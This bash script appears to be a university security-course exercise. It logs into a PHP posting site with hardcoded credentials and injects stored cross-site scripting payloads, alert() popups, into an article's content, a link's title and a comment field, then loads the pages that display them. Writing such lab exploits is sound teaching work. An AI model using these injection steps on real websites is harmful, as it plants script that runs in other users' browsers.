#!/bin/bash

if [ $# -ne 2 ]; then
	PREFIX="ugster21.student.cs.uwaterloo.ca/sdsuo"
else
	IP=$1
	PORT=$2
	PREFIX=$IP:$PORT
fi

echo "=====[Setup]====="
POST_PAGE="$PREFIX/post.php"
HOME_PAGE="$PREFIX/index.php"
VIEW_PAGE="$PREFIX/view.php"
echo "Using Login Page at: $POST_PAGE"
echo "Using Home Page at: $HOME_PAGE"
echo "Using View Page at: $VIEW_PAGE"

echo "=====[Login]====="
USERNAME="alice"
PASSWORD="passw0rd"
echo "Using username: $USERNAME"
echo "Using password: $PASSWORD"

echo "Logging in with POST request"
curl \
-c "cookie.txt" \
-d "form=login" \
-d "submit=Login" \
-d "username=$USERNAME" \
-d "password=$PASSWORD" \
$POST_PAGE
echo

echo "=====[Attack 1: Content Field of Article Post]====="
ARTICLE_TYPE=1
ARTICLE_POPUP="<script type='text/javascript'> alert('Popup from content field of article post');</script>"
ARTICLE_TITLE="Attack on content field of article post"

echo "Using article title: $ARTICLE_TITLE"
echo "Using article content: $ARTICLE_POPUP"

curl \
-b "cookie.txt" \
-d "form=content" \
-d "submit=Post" \
-d "type=$ARTICLE_TYPE" \
--data-urlencode "title=$ARTICLE_TITLE" \
--data-urlencode "content=$ARTICLE_POPUP" \
$POST_PAGE

echo "=====[Attack 2: Title Field of Link Post]====="
LINK_TYPE=2
LINK_CONTENT="Attack on title field of link post"
LINK_POPUP="<script type='text/javascript'> alert('Popup from title field of link post');</script>"

echo "Using link title: $LINK_POPUP"
echo "Using link content: $LINK_CONTENT"

curl \
-b "cookie.txt" \
-d "form=content" \
-d "submit=Post" \
-d "type=$LINK_TYPE" \
--data-urlencode "title=$LINK_POPUP" \
--data-urlencode "content=$LINK_CONTENT" \
$POST_PAGE

echo "=====[Attack 3: Comment Field of Comment Post]====="
COMMENT_POPUP="Attack on comment field of comment post<script type='text/javascript'> alert('Popup from comment field of comment post');</script>"
COMMENT_PARENT=1
COMMENT_UID=7

echo "Using user id: $COMMENT_UID"
echo "Using comment parent: $COMMENT_PARENT"
echo "Using comment: $COMMENT_POPUP"

curl \
-b "cookie.txt" \
-d "form=comment" \
-d "submit=Post" \
-d "parent=$COMMENT_PARENT" \
-d "uid=$COMMENT_UID" \
--data-urlencode "comment=$COMMENT_POPUP" \
$POST_PAGE

echo "=====[Index Page]====="
echo "Showing index page with GET request"
curl -b "cookie.txt" $HOME_PAGE

echo "=====[View Post Page]====="
echo "Showing view post page with GET request"
curl -b "cookie.txt" $VIEW_PAGE?id=$COMMENT_PARENT
